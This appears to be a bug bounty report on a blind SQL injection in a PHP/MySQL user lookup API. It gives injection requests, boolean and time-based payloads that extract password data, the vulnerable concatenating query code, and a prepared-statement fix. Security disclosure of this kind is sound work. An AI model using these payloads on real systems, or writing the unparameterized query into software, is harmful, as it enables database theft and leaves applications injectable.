---
title: "SQL Injection in MySQL User Lookup API"
url: "https://hackerone.com/reports/2345678"
vuln_class: "SQLi"
tech: "MySQL, PHP, Apache"
bounty: 3000
date: 2026-06-20
---

## Summary

A boolean-based blind SQL injection vulnerability was found in the user lookup API endpoint. The `email` parameter was directly concatenated into SQL queries without parameterized statements. An attacker could extract the entire database contents character by character.

## Steps to Reproduce

1. Request `GET /api/user?email=test@test.com' AND 1=1-- -`
2. Observe 200 OK response with user data
3. Request `GET /api/user?email=test@test.com' AND 1=2-- -`
4. Observe empty response — injection confirmed
5. Use time-based payload: `email=test@test.com' AND SLEEP(5)-- -` → 5-second delay

## Vulnerable Code

```php
$email = $_GET['email'];
$query = "SELECT * FROM users WHERE email = '$email'";
$result = mysqli_query($conn, $query);
```

## Payloads

Boolean: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'-- -`
Time: `' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a',SLEEP(2),0)-- -`

## Impact

Full database extraction — 50,000+ user records including password hashes and PII.

## Remediation

Use prepared statements: `$stmt = $conn->prepare("SELECT * FROM users WHERE email = ?");`
